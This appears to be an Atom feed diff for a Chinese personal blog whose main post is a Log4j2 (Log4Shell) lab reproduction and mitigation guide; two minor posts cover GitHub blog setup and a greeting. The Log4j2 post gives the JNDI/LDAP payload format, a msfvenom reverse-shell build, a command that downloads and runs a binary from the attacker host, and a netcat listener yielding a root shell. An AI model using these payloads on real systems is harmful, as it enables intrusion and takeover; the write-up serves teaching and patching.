@@ -1,0 +1,430 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+    <id>https://iMayday-Yee.github.io</id>
+    <title>Yzone</title>
+    <updated>2023-01-10T16:27:42.283Z</updated>
+    <generator>https://github.com/jpmonette/feed</generator>
+    <link rel="alternate" href="https://iMayday-Yee.github.io"/>
+    <link rel="self" href="https://iMayday-Yee.github.io/atom.xml"/>
+    <subtitle>一个真正属于你的空间</subtitle>
+    <logo>https://iMayday-Yee.github.io/images/avatar.png</logo>
+    <icon>https://iMayday-Yee.github.io/favicon.ico</icon>
+    <rights>All rights reserved 2023, Yzone</rights>
+    <entry>
+        <title type="html"><![CDATA[Log4j2漏洞的讲解和复现]]></title>
+        <id>https://iMayday-Yee.github.io/post/log4j2/</id>
+        <link href="https://iMayday-Yee.github.io/post/log4j2/">
+        </link>
+        <updated>2023-01-10T14:45:34.000Z</updated>
+        <content type="html"><![CDATA[<p> <br>
+<ul class="markdownIt-TOC">
+<li><a href="#%E5%89%8D%E8%A8%80">前言</a></li>
+<li><a href="#log4j2%E7%AE%80%E4%BB%8B">Log4j2简介</a></li>
+<li><a href="#jdni%E4%BB%8B%E7%BB%8D">JDNI介绍</a></li>
+<li><a href="#ldap%E7%AE%80%E4%BB%8B">LDAP简介</a></li>
+<li><a href="#%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86">攻击原理</a></li>
+<li><a href="#%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83">实验环境</a></li>
+<li><a href="#%E5%88%9D%E6%AD%A5%E6%94%BB%E5%87%BB%E8%BF%90%E8%A1%8C%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4">初步攻击——运行任意命令</a></li>
+<li><a href="#%E8%BF%9B%E4%B8%80%E6%AD%A5%E6%94%BB%E5%87%BB%E8%8E%B7%E5%BE%97shell">进一步攻击——获得shell</a></li>
+<li><a href="#%E4%BF%AE%E5%A4%8D%E6%BC%8F%E6%B4%9E">修复漏洞</a></li>
+</ul>
+<br>
+ </p>
+<h1 id="前言">前言</h1>
+<p> <br>
+2021年底，Log4j2任意代码执行漏洞被爆出，整个IT界沸沸扬扬。Apache Log4j2是一款开源的Java日志记录框架，提供方便的日志记录，通过定义每一条日志信息的级别，能够更加细致地控制日志生成过程，以便用于编写程序时进行调试，在项目上线后出现状况时也可根据日志记录来判断原因，被广泛大量用于业务系统开发环境中。</p>
+<p>从Apache Log4j2漏洞影响面查询的统计来看，该漏洞影响多达数万个开源软件，涉及相关版本软件包更是达到了数十万个。经验证，Apache Struts2、Apache Solr、Apache Druid、Apache Flink等众多组件与大型应用均受影响，该漏洞无需授权即可远程代码执行，一旦被攻击者利用会造成严重后果，影响范围覆盖各行各业，危害极其严重。而本次漏洞的触发方式简单，利用成本极低，可以说是一场Java生态的“浩劫”。</p>
+<p>本次实验将对Log4j2漏洞进行讲解，并通过复现的方式展现其原理和利用方法。<br>
+ </p>
+<h1 id="log4j2简介">Log4j2简介</h1>
+<p> <br>
+Apache Log4j2是对Log4j的升级，它比其前身Log4j 1.x提供了重大改进，并提供了Logback中可用的许多改进，同时修复了Logback架构中的一些问题。是目前最优秀的Java日志框架之一。</p>
+<p>Log4j2是Apache的一个开源项目，通过使用Log4j2，我们可以控制日志信息输送的目的地是控制台、文件、GUI组件，甚至是套接口服务器、NT的事件记录器、UNIX Syslog守护进程等；我们也可以控制每一条日志的输出格式；通过定义每一条日志信息的级别，我们能够更加细致地控制日志的生成过程。最令人感兴趣的就是，这些可以通过一个配置文件来灵活地进行配置，而不需要修改应用的代码。<br>
+ </p>
+<h1 id="jdni介绍">JDNI介绍</h1>
+<p> <br>
+JNDI全称 Java Naming and Directory Interface。JNDI是Java平台的一个标准扩展，提供了一组接口、类和关于命名空间的概念。如同其它很多Java技术一样，JDNI是provider-based的技术，暴露了一个API和一个服务供应接口（SPI）。这意味着任何基于名字的技术都能通过JNDI而提供服务，只要JNDI支持这项技术。JNDI目前所支持的技术包括LDAP、CORBA Common Object Service（COS）名字服务、RMI、NDS、DNS、Windows注册表等等。很多J2EE技术，包括EJB都依靠JNDI来组织和定位实体。</p>
+<p>JDNI通过绑定的概念将对象和名称联系起来。在一个文件系统中，文件名被绑定给文件。在DNS中，一个IP地址绑定一个URL。在目录服务中，一个对象名被绑定给一个对象实体。</p>
+<p>JNDI中的一组绑定作为上下文来引用。每个上下文暴露的一组操作是一致的。例如，每个上下文提供了一个查找操作，返回指定名字的相应对象。每个上下文都提供了绑定和撤除绑定名字到某个对象的操作。JNDI使用通用的方式来暴露命名空间，即使用分层上下文以及使用相同命名语法的子上下文。可以简单的将LDAP理解为一个存储目录，里面有我们要的资源，而JNDI就是获取资源的一种途径。</p>
+<p>在该漏洞利用过程中涉及到的JNDI中的API和代码流程等详细信息可以参考这篇博客：<a href="https://www.cnblogs.com/gupaoedu-tom/p/15710397.html">JNDI详细介绍</a>。<br>
+ </p>
+<h1 id="ldap简介">LDAP简介</h1>
+<p> <br>
+目录服务是一个特殊的数据库，用来保存描述性的、基于属性的详细信息，支持过滤功能。 LDAP（Light Directory Access Portocol），它是基于X.500标准的轻量级目录访问协议。 目录是一个为查询、浏览和搜索而优化的数据库，它成树状结构组织数据，类似文件目录一样。 目录数据库和关系数据库不同，它有优异的读性能，但写性能差，并且没有事务处理、回滚等复杂功 能，不适于存储修改频繁的数据。所以目录天生是用来查询的，就好象它的名字一样。 LDAP目录服务是由目录数据库和一套访问协议组成的系统。 简单来说：LDAP是一个目录服务，可以通过目录路径查询到对应目录下的对象（文件）等。即其也是 JNDI的实现，通过名称（目录路径）查询到对象（目录下的文件）。<br>
+ </p>
+<h1 id="攻击原理">攻击原理</h1>
+<p> <br>
+远程代码执行漏洞，是利用了Log4j2可以对日志中的 <code>${}</code> 进行解析执行，来进行攻击的。程序开发、调试时，可能会对客户端传来的参数在日志中直接输出，用来监控、调试和查错等。如果此时客户端传来的参数含有“${}”，并有恶意代码，就会受到攻击。</p>
+<p>一个简单的实现攻击的方式是：利用jndi访问ldap服务后，ldap服务返回了class攻击代码，被攻击的服务器执行了攻击代码。</p>
+<p>在本次实验中，攻击具体实现方式和过程如下图所示，其中攻击者脚本程序和恶意Jar包下载服务可以都由攻击机运行和部署。</p>
+<figure data-type="image" tabindex="1"><img src="https://raw.githubusercontent.com/iMayday-Yee/Pictures/main/default/log4j2/1.png" alt="" loading="lazy"></figure>
+<ul>
+<li>攻击者首先发布一个RMI服务，此服务将绑定一个引用类型的RMI对象。在引用对象中指定一个远程的含有恶意代码的类。例如：包含 system.exit(1) 等类似的危险操作和恶意代码的下载地址。</li>
+<li>攻击者再发布另一个恶意代码下载服务，此服务可以下载所有含有恶意代码的类。</li>
+<li>攻击者利用Log4j2的漏洞注入RMI调用，例如：logger.info(&quot;日志信息 ${jndi:rmi://rmi-service:port/example}&quot;)。</li>
+<li>调用RMI后将获取到引用类型的RMI远程对象，该对象将就加载恶意代码并执行。</li>
+</ul>
+<p>利用该漏洞进行攻击的具体代码运行过程可以参考：<a href="https://blog.csdn.net/weixin_43263451/article/details/126289723">Log4j2漏洞代码分析</a><br>
+ </p>
+<h1 id="实验环境">实验环境</h1>
+<p> <br>
+<strong>宿主机</strong>：系统为Ubuntu 20.04，IP地址为192.168.151.129（使用docker在其中运行受害机镜像）</p>
+<p><strong>攻击机</strong>：系统为Kali，IP地址为192.168.151.139<br>
+ </p>
+<h1 id="初步攻击运行任意命令">初步攻击——运行任意命令</h1>
+<p> </p>
+<ol>
+<li>
+<p>首先需要在宿主机安装docker</p>
+<figure data-type="image" tabindex="2"><img src="https://raw.githubusercontent.com/iMayday-Yee/Pictures/main/default/log4j2/2.png" alt="" loading="lazy"></figure>
+</li>
+<li>
+<p>在宿主机上部署具有Java漏洞的docker</p>
+<pre><code># docker pull registry.cn-hangzhou.aliyuncs.com/fengxuan/log4j_vuln
+</code></pre>
+<figure data-type="image" tabindex="3"><img src="https://raw.githubusercontent.com/iMayday-Yee/Pictures/main/default/log4j2/3.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="4"><img src="https://raw.githubusercontent.com/iMayday-Yee/Pictures/main/default/log4j2/4.png" alt="" loading="lazy"></figure>
+</li>
+<li>
+<p>启动docker</p>
+<pre><code># docker run -it -d -p 8080:8080 --name log4j_vuln_container registry.cn-hangzhou.aliyuncs.com/fengxuan/log4j_vuln
+</code></pre>
+<figure data-type="image" tabindex="5"><img src="https://raw.githubusercontent.com/iMayday-Yee/Pictures/main/default/log4j2/5.png" alt="" loading="lazy"></figure>
+</li>
+<li>
+<p>进入docker命令行并启动服务</p>
+<pre><code># docker exec -it log4j_vuln_container /bin/bash
+# uname -a
+# /bin/bash /home/apache-tomcat-8.5.45/bin/startup.sh
+</code></pre>
+<figure data-type="image" tabindex="6"><img src="https://raw.githubusercontent.com/iMayday-Yee/Pictures/main/default/log4j2/6.png" alt="" loading="lazy"></figure>
+</li>
+<li>
+<p>查看docker内服务是否启动成功</p>
+<ul>
+<li>
+<p>由于该镜像里没有预先安装基本网络排查工具 <code>net-tools</code> ，所以首先安装net-tools</p>
+<pre><code># yum install net-tools
+</code></pre>
+<figure data-type="image" tabindex="7"><img src="https://raw.githubusercontent.com/iMayday-Yee/Pictures/main/default/log4j2/7.png" alt="" loading="lazy"></figure>
+</li>
+<li>
+<p>安装完之后使用 <code>netstat</code> 命令查看当前docker内网络状态</p>
+<pre><code># netstat -nlpt
+</code></pre>
+<figure data-type="image" tabindex="8"><img src="https://raw.githubusercontent.com/iMayday-Yee/Pictures/main/default/log4j2/8.png" alt="" loading="lazy"></figure>
+</li>
+</ul>
+</li>
+<li>
+<p>服务启动成功之后可以在Kali（攻击机）中访问该网页，地址栏中输入 <code>http://宿主机IP:8080/webstudy/</code> 即可访问</p>
+<figure data-type="image" tabindex="9"><img src="https://raw.githubusercontent.com/iMayday-Yee/Pictures/main/default/log4j2/9.png" alt="" loading="lazy"></figure>
+</li>
+<li>
+<p>为了部署恶意的JNDI服务，攻击机下载JNDIExploit-1.2-SNAPSHOT.jar，地址为： <a href="https://github.com/Mr-xn/JNDIExploit-1/releases/tag/v1.2">JNDIExploit-1.2-SNAPSHOT.jar下载地址</a></p>
+<figure data-type="image" tabindex="10"><img src="https://raw.githubusercontent.com/iMayday-Yee/Pictures/main/default/log4j2/10.png" alt="" loading="lazy"></figure>
+</li>
+<li>
+<p>在攻击机上部署恶意的JNDI服务</p>
+<pre><code># java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 攻击机IP -p 服务端口
+</code></pre>
+<figure data-type="image" tabindex="11"><img src="https://raw.githubusercontent.com/iMayday-Yee/Pictures/main/default/log4j2/11.png" alt="" loading="lazy"></figure>
+</li>
+<li>
+<p>在攻击机上打开burpsuite，使用内置浏览器访问宿主机上的网页</p>
+<figure data-type="image" tabindex="12"><img src="https://raw.githubusercontent.com/iMayday-Yee/Pictures/main/default/log4j2/12.png" alt="" loading="lazy"></figure>
+</li>
+<li>
+<p>点击网页中的 <code>hit me</code> 之后，可以在HTTP history中看到刚刚访问网页的GET请求</p>
+<figure data-type="image" tabindex="13"><img src="https://raw.githubusercontent.com/iMayday-Yee/Pictures/main/default/log4j2/13.png" alt="" loading="lazy"></figure>
+</li>
+<li>
+<p>接下来需要将这个GET请求转换为POST请求并重复发送</p>
+<ul>
+<li>
+<p>首先在GET请求具体内容界面空白处右键，选择 <code>Send to Repeater</code> ，将GET请求复制到burpsuite的Repeater中</p>
+<figure data-type="image" tabindex="14"><img src="https://raw.githubusercontent.com/iMayday-Yee/Pictures/main/default/log4j2/14.png" alt="" loading="lazy"></figure>
+</li>
+<li>
+<p>转到Repeater标签页，可以看到请求内容已经被复制过去了</p>
+<figure data-type="image" tabindex="15"><img src="https://raw.githubusercontent.com/iMayday-Yee/Pictures/main/default/log4j2/15.png" alt="" loading="lazy"></figure>
+</li>
+<li>
+<p>由于burp suite内置了转变请求类型的功能，在GET请求具体内容空白处右键选择 <code>Change request method</code> 即可将GET请求转变为POST请求</p>
+<figure data-type="image" tabindex="16"><img src="https://raw.githubusercontent.com/iMayday-Yee/Pictures/main/default/log4j2/16.png" alt="" loading="lazy"></figure>
+</li>
+<li>
+<p>转变之后</p>
+<figure data-type="image" tabindex="17"><img src="https://raw.githubusercontent.com/iMayday-Yee/Pictures/main/default/log4j2/17.png" alt="" loading="lazy"></figure>
+</li>
+</ul>
+</li>
+<li>
+<p>接下来在上面转换生成的POST请求中给添加恶意内容，利用上述log4j2中由于 <code>${}</code> 格式机制产生的漏洞进行攻击</p>
+<ul>
+<li>
+<p>Payload的格式为 <code>${jndi:ldap://攻击机（运行了恶意ldap服务）的IP:ldap服务端口（上文设置的是1389）/Basic/Command/Base64/base64命令}</code> 。注意到payload里是不能直接写入命令本身的字符串的，所以需要先把想要执行的命令转换为base64加密之后再写入payload。这里先以一个简单的命令 <code>echo yyy &gt; /tmp/hustcse</code> 为例，它的功能是先在宿主机 <code>/tmp</code> 目录中新建一个名为 <code>hustcse</code> 的文件，并将字符串<code>yyy</code>写入其中。使用Kali自带的加密功能将上述命令加密为base64编码。</p>
+<figure data-type="image" tabindex="18"><img src="https://raw.githubusercontent.com/iMayday-Yee/Pictures/main/default/log4j2/18.png" alt="" loading="lazy"></figure>
+</li>
+<li>
+<p>加密结果是 <code>ZWNobyB5eXkgPiAvdG1wL2h1c3Rjc2UK</code> ，因此将其填入上面的payload中。回到burpsuite中，将上述payload参数填完之后写入POST请求。</p>
+<figure data-type="image" tabindex="19"><img src="https://raw.githubusercontent.com/iMayday-Yee/Pictures/main/default/log4j2/19.png" alt="" loading="lazy"></figure>
+</li>
+</ul>
+</li>
+<li>
+<p>发送构造好之后的恶意POST请求</p>
+<ul>
+<li>
+<p>在发送前先在宿主机上运行的docker里检查一下 <code>/tmp</code> 目录下没有攻击机要创建的文件</p>
+<figure data-type="image" tabindex="20"><img src="https://raw.githubusercontent.com/iMayday-Yee/Pictures/main/default/log4j2/20.png" alt="" loading="lazy"></figure>
+</li>
+<li>
+<p>然后在攻击机的burpsuite中点击 <code>send</code> 按钮发送刚刚构造的恶意POST请求</p>
+<figure data-type="image" tabindex="21"><img src="https://raw.githubusercontent.com/iMayday-Yee/Pictures/main/default/log4j2/21.png" alt="" loading="lazy"></figure>
+</li>
+<li>
+<p>此时可以看到受害机发来了Response，内容是该镜像作者设置的提示语句，看到这里大致能猜到攻击成功</p>
+<figure data-type="image" tabindex="22"><img src="https://raw.githubusercontent.com/iMayday-Yee/Pictures/main/default/log4j2/22.png" alt="" loading="lazy"></figure>
+</li>
+<li>
+<p>为了进一步验证，打开刚刚在攻击机上部署的恶意ldap服务的终端，可以看到有了回应，表明宿主机向这个恶意ldap服务发出了一个请求，其中包含了上面构建的payload，并且payload中的base64编码的命令也被成功解析成了我们预期要设置的命令，然后攻击机中的http服务向受害机提供了一个恶意的java类</p>
+<figure data-type="image" tabindex="23"><img src="https://raw.githubusercontent.com/iMayday-Yee/Pictures/main/default/log4j2/23.png" alt="" loading="lazy"></figure>
+</li>
+<li>
+<p>接下来进行最后的确定，进入宿主机的运行的docker，查看/tmp目录下的文件，发现了创建的名为“hustcse”的文件，并且其具体的内容也是设置的字符串“yyy”。证明成功在受害机上运行了攻击者自定义的命令。</p>
+<p><img src="https://raw.githubusercontent.com/iMayday-Yee/Pictures/main/default/log4j2/24.png" alt="" loading="lazy"><br>
+ </p>
+</li>
+</ul>
+</li>
+</ol>
+<h1 id="进一步攻击获得shell">进一步攻击——获得shell</h1>
+<p> <br>
+当然，攻击者肯定不满足于每次构建一个payload并发出请求，控制受害机最好的方法是反弹一个shell（shell reverse），接下来就进一步地将受害机的shell反弹到攻击机中</p>
+<ol>
+<li>
+<p>首先在攻击机上使用metasploit工具创建一个基于TCP连接的64位linux系统的shell reverse的二进制文件，并输出到 <code>reverse.elf</code> 二进制文件中</p>
+<pre><code># msfvenom -p linux/x64/shell_reverse_tcp LHOST=（攻击机IP地址） LPORT=（攻击机监听反弹shell的端口） -f elf -o ./reverse.elf
+</code></pre>
+<figure data-type="image" tabindex="24"><img src="https://raw.githubusercontent.com/iMayday-Yee/Pictures/main/default/log4j2/25.png" alt="" loading="lazy"></figure>
+</li>
+<li>
+<p>接下来需要用上文中提到的方式使得受害机从攻击机上下载到这个刚刚创建的二进制文件 <code>reverse.elf</code> ，接着给予其权限并运行</p>
+<ul>
+<li>
+<p>因此需要向payload中写入的命令为</p>
+<pre><code>wget http://（攻击者IP）/reverse.elf &amp;&amp; chmod +x reverse.elf &amp;&amp; ./reverse.elf
+</code></pre>
+</li>
+<li>
+<p>依然是使用上面的方法将上述命令转化为base64编码</p>
+<figure data-type="image" tabindex="25"><img src="https://raw.githubusercontent.com/iMayday-Yee/Pictures/main/default/log4j2/26.png" alt="" loading="lazy"></figure>
+</li>
+<li>
+<p>然后将加密之后的命令填入到burpsuite中的POST请求里，构造恶意请求</p>
+<figure data-type="image" tabindex="26"><img src="https://raw.githubusercontent.com/iMayday-Yee/Pictures/main/default/log4j2/27.png" alt="" loading="lazy"></figure>
+</li>
+</ul>
+</li>
+<li>
+<p>在发送恶意请求之前需要注意，攻击机除了需要一直运行上文中的恶意ldap服务，还需要打开 <code>80</code> 端口运行一个http服务让受害机能够从攻击机中下载到reverse.elf文件。启动http服务的方式是在 <code>reverse.elf</code> 文件所在目录下执行下述命令</p>
+<pre><code># sudo python -m SimpleHTTPServer 80
+</code></pre>
+<figure data-type="image" tabindex="27"><img src="https://raw.githubusercontent.com/iMayday-Yee/Pictures/main/default/log4j2/28.png" alt="" loading="lazy"></figure>
+</li>
+<li>
+<p>此时可以在攻击机上访问自己的ip地址检验是否开启成功</p>
+<figure data-type="image" tabindex="28"><img src="https://raw.githubusercontent.com/iMayday-Yee/Pictures/main/default/log4j2/29.png" alt="" loading="lazy"></figure>
+</li>
+<li>
+<p>为了能够监听到反弹的shell，攻击机还需要开一个 <code>443</code> 端口监听</p>
+<pre><code># sudo nc -vnlp 443
+</code></pre>
+<figure data-type="image" tabindex="29"><img src="https://raw.githubusercontent.com/iMayday-Yee/Pictures/main/default/log4j2/30.png" alt="" loading="lazy"></figure>
+</li>
+<li>
+<p>这下 <strong>万事俱备，只欠东风</strong> 了，在上述工作都做完之后，理论上只需要将刚刚构造的恶意POST请求发送给受害机即可完成攻击并在攻击机中监听到反弹的shell</p>
+<ul>
+<li>
+<p>在burpsuite中点击 <code>send</code> 按钮</p>
+<figure data-type="image" tabindex="30"><img src="https://raw.githubusercontent.com/iMayday-Yee/Pictures/main/default/log4j2/31.png" alt="" loading="lazy"></figure>
+</li>
+<li>
+<p>发送之后可以在攻击机运行恶意ldap服务的终端中看到相关提示信息</p>
+<figure data-type="image" tabindex="31"><img src="https://raw.githubusercontent.com/iMayday-Yee/Pictures/main/default/log4j2/32.png" alt="" loading="lazy"></figure>
+</li>
+<li>
+<p>然而查看 <code>80</code> 端口的http服务却没看到受害机从攻击机中下载 <code>reverse.elf</code> 文件的提示信息</p>
+<figure data-type="image" tabindex="32"><img src="https://raw.githubusercontent.com/iMayday-Yee/Pictures/main/default/log4j2/33.png" alt="" loading="lazy"></figure>
+</li>
+<li>
+<p>并且监听端口也没有获得反弹的shell。去受害机的目录下检查之后发现也根本没有下载到 <code>reverse.elf</code> 文件。这是为什么呢？结合之前该docker镜像中连 <code>net-tools</code> 都没有安装的经历，怀疑是这个镜像中根本没有安装 <code>wget</code> ，并且可以到宿主机中证明确实如此，所以执行以下命令在受害机中安装 <code>wget</code></p>
+<pre><code># yum install wget
+</code></pre>
+<figure data-type="image" tabindex="33"><img src="https://raw.githubusercontent.com/iMayday-Yee/Pictures/main/default/log4j2/34.png" alt="" loading="lazy"></figure>
+</li>
+</ul>
+</li>
+<li>
+<p>回到攻击机再次发送恶意POST请求</p>
+<ul>
+<li>
+<p>这次依然可以在攻击机运行恶意ldap服务的终端中看到一则新的相关提示信息</p>
+<figure data-type="image" tabindex="34"><img src="https://raw.githubusercontent.com/iMayday-Yee/Pictures/main/default/log4j2/35.png" alt="" loading="lazy"></figure>
+</li>
+<li>
+<p>但是和上次不一样的是，这次可以看到受害机成功从攻击机中下载了 <code>reverse.elf</code> 文件</p>
+<figure data-type="image" tabindex="35"><img src="https://raw.githubusercontent.com/iMayday-Yee/Pictures/main/default/log4j2/36.png" alt="" loading="lazy"></figure>
+</li>
+<li>
+<p>并且可以在受害机中看到下载了reverse.elf文件</p>
+<figure data-type="image" tabindex="36"><img src="https://raw.githubusercontent.com/iMayday-Yee/Pictures/main/default/log4j2/37.png" alt="" loading="lazy"></figure>
+</li>
+<li>
+<p>最重要的是，攻击机的监听端口成功获得了受害机反弹的shell，并且可以以root身份运行任何命令</p>
+<figure data-type="image" tabindex="37"><img src="https://raw.githubusercontent.com/iMayday-Yee/Pictures/main/default/log4j2/38.png" alt="" loading="lazy"></figure>
+</li>
+</ul>
+</li>
+</ol>
+<p>至此攻击成功!<br>
+ </p>
+<h1 id="修复漏洞">修复漏洞</h1>
+<p> </p>
+<ol>
+<li>
+<p>临时修复</p>
+<ol>
+<li>
+<p>方式1</p>
+<ul>
+<li>修改启动脚本或命令，添加“-Dlog4j2.formatMsgNoLookups=true ” 启动参数和参数值(不包括引号)</li>
+<li>使用修改后的脚本或命令重启服务</li>
+</ul>
+</li>
+<li>
+<p>方式2</p>
+<ul>
+<li>在应用classpath下添加log4j2.component.properties配置文件，文件内容为log4j2.formatMsgNoLookups=true</li>
+<li>也可以通命令行参数指定：<code>java -Dlog4j.configurationFile=../config/log4j2.component.properties</code></li>
+</ul>
+</li>
+<li>
+<p>方式3</p>
+<ul>
+<li>将系统环境变量FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS设置为true</li>
+</ul>
+</li>
+</ol>
+</li>
+<li>
+<p>研发源码级修复方案</p>
+<ol>
+<li>
+<p>通过版本覆盖，将项目依赖的Log4j2升级到最新版本</p>
+<ul>
+<li>在项目主pom.xml中引入Log4j2的最新版本进行版本覆盖</li>
+<li>代码级别验证</li>
+<li>利用 Idea 插件 maven helper 进行验证</li>
+<li>查看打包后的 jar 文件进行验证</li>
+</ul>
+</li>
+<li>
+<p>将项目中的 Log4j2 依赖排除</p>
+<ul>
+<li>利用 Maven Helper 插件搜索出，依赖关系，在引入依赖的节点直接将 Log4j2 的引入排除掉即可</li>
+</ul>
+</li>
+</ol>
+</li>
+<li>
+<p>第三方应用服务修复</p>
+<ul>
+<li>此次漏洞受影响的范围还是非常广泛的，包括一些常用的中间件、数据库，如果： ES、Kafka等；</li>
+<li>这些第三方的应用服务，修复起来是比较棘手的，短时间内在官方没有发布安全版本的情况下，只能临时通过替换应用目录中的jar文件的方式进行修复；</li>
+<li>可以去官方的snapshot库下载最新的 jar 文件，对第三方服务进行替换操作；</li>
+<li>注意做好文件备份工作，有的服务可能会出现启动失败的情况</li>
+</ul>
+</li>
+</ol>
+<p> </p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[利用Github搭建博客教程]]></title>
+        <id>https://iMayday-Yee.github.io/post/howtobuild/</id>
+        <link href="https://iMayday-Yee.github.io/post/howtobuild/">
+        </link>
+        <updated>2021-07-27T11:34:05.000Z</updated>
+        <content type="html"><![CDATA[<p> <br>
+<ul class="markdownIt-TOC">
+<li><a href="#%E4%B8%80-%E5%86%99%E5%9C%A8%E5%89%8D%E9%9D%A2%E7%9A%84%E8%AF%9D">一、写在前面的话</a></li>
+<li><a href="#%E4%BA%8C-%E5%89%8D%E6%9C%9F%E5%87%86%E5%A4%87">二、前期准备</a></li>
+<li><a href="#%E4%B8%89-%E7%94%A8%E5%88%B0%E7%9A%84%E8%BD%AF%E4%BB%B6">三、用到的软件</a>
+<ul>
+<li><a href="#1-github%E6%A1%8C%E9%9D%A2%E7%AB%AF%E5%BA%94%E7%94%A8">1. GitHub桌面端应用</a></li>
+<li><a href="#2-gridea">2. Gridea</a></li>
+<li><a href="#3-vs-code">3. VS Code</a></li>
+</ul>
+</li>
+<li><a href="#%E5%9B%9B-%E5%85%B6%E4%BB%96">四、其他</a></li>
+</ul>
+<br>
+ </p>
+<h1 id="一-写在前面的话">一、写在前面的话</h1>
+<p> <br>
+  曾经我也有过自己的博客网站，当时是租的阿里云服务器，再租个域名，搭配宝塔面板以及wordpress、zblog、typecho等知名博客搭建平台的一键部署，写文章、换主题等都是比较方便的。</p>
+<p>  然而后来由于囊中羞涩，再加上资本家利用用户对已有的服务器和域名的依赖疯狂压榨无产阶级，我租不起服务器和域名了，因此决定利用GitHub创建一个静态的博客网站，虽然在写文章、个性化等方面比较麻烦，但是胜在它不要钱，也没有过期了需要进行数据迁移的烦恼了。<br>
+ </p>
+<h1 id="二-前期准备">二、前期准备</h1>
+<p> <br>
+  1. 首先得有一个GitHub帐号，具体就不讲解了。</p>
+<p>  2. 新建一个Repositories，名称格式为：<code>用户名.github.io</code>，下面选择<code>Public</code>并且勾选<code>Add a README file</code>。</p>
+<figure data-type="image" tabindex="1"><img src="https://raw.githubusercontent.com/iMayday-Yee/Pictures/main/default/howtobuildagithubblog/2.png" alt="" loading="lazy"></figure>
+<p>  3. 新建完仓库后，访问<code>https:// + 你仓库的名字</code>即可打开你的网站。</p>
+<p>  4. 打开个人设置，依次在左边栏选择<code>Developer settings</code>-&gt;<code>Personal access tokens</code>-&gt;<code>Generate new token</code>，然后按下图选择和创建token，并记录，后续会使用到。</p>
+<p><img src="https://raw.githubusercontent.com/iMayday-Yee/Pictures/main/default/howtobuildagithubblog/3.png" alt="" loading="lazy"><br>
+<img src="https://raw.githubusercontent.com/iMayday-Yee/Pictures/main/default/howtobuildagithubblog/4.png" alt="" loading="lazy"><br>
+ </p>
+<h1 id="三-用到的软件">三、用到的软件</h1>
+<p> </p>
+<h2 id="1-github桌面端应用">1. GitHub桌面端应用</h2>
+<p>  本人不太习惯用命令行，因为太多命令有时候会记不住或者记错，为了减少写博客时的麻烦，我选择使用了GitHub官方的桌面应用。</p>
+<p>  使用方法很简单，现在本地仓库上传文档图片等，然后在桌面端应用选择相应的仓库和分支，点击左下角按钮后点击右上角按钮即可。唯一难受的地方就是可能有时候网络连接不好，会导致上传失败。多试几次就好了。</p>
+<p><img src="https://raw.githubusercontent.com/iMayday-Yee/Pictures/main/default/howtobuildagithubblog/1.png" alt="" loading="lazy"><br>
+ </p>
+<h2 id="2-gridea">2. Gridea</h2>
+<p>  Gridea是一个静态博客写作客户端，支持markdown语法、插入图片、标签分组、修改主题等常用功能，操作简单，可以将博客文章保存在本地，然后再上传至GitHub，因此非常便于管理。</p>
+<p>  下载安装完Gridea之后，在左侧<code>远程</code>中按照下图设置，然后点击<code>保存</code>和<code>检测远程连接</code>，连接成功就说明大功告成了。容易出问题的地方是明明能够远程连接但是却在同步时出错，这个一般与网络有关，多试几次就好了。</p>
+<p><img src="https://raw.githubusercontent.com/iMayday-Yee/Pictures/main/default/howtobuildagithubblog/5.png" alt="" loading="lazy"><br>
+ </p>
+<h2 id="3-vs-code">3. VS Code</h2>
+<p>  VS Code主要用来写博客的内容，因为Gridea中的编辑器不能实时预览，所以为了方便可以在“全世界最好的编辑器”中安装相应插件进行文章的撰写。</p>
+<p>  我使用了两款插件，一个是<code>Markdown All in One</code>，一个是<code>Markdown Preview Github Styling</code>。</p>
+<figure data-type="image" tabindex="2"><img src="https://raw.githubusercontent.com/iMayday-Yee/Pictures/main/default/howtobuildagithubblog/6.png" alt="" loading="lazy"></figure>
+<p>  该插件可以在编辑文章的时候点击右上角按钮实时预览文章效果。</p>
+<p><img src="https://raw.githubusercontent.com/iMayday-Yee/Pictures/main/default/howtobuildagithubblog/7.png" alt="" loading="lazy"><br>
+ </p>
+<h1 id="四-其他">四、其他</h1>
+<p> <br>
+  1. 关于插入图片：我的解决办法是另外建了一个仓库，每次写博客的时候将需要用到的图片上传至该仓库，然后获得一个图片地址，再在文章中引用。</p>
+<p>  2. Gridea左栏的主题中可以选择不同的主题以及一些具体配置。</p>
+<p>  3. markdown语法中可以用<code>&amp;emsp;&amp;emsp;</code>实现首行两个（中文）字符的缩进，可以用<code>&amp;nbsp;</code>实现空行。</p>
+<p>  4. 在Gridea中写文章时可以在右边栏中设置封面图片、标签、时间、是否置顶等，也可以插入图片和表情以及分隔符。</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[我的第一篇博客]]></title>
+        <id>https://iMayday-Yee.github.io/post/myfirstblog/</id>
+        <link href="https://iMayday-Yee.github.io/post/myfirstblog/">
+        </link>
+        <updated>2021-07-14T05:18:20.000Z</updated>
+        <content type="html"><![CDATA[<p>这是我在Github上写的第一篇Blog</p>
+<p><strong>Hello World！😀</strong></p>
+<p> </p>
+<div align=center>
+<img src="https://raw.githubusercontent.com/iMayday-Yee/Pictures/main/default/firstblog/2.jpg" width="35%" />
+</div>]]></content>
+    </entry>
+</feed>
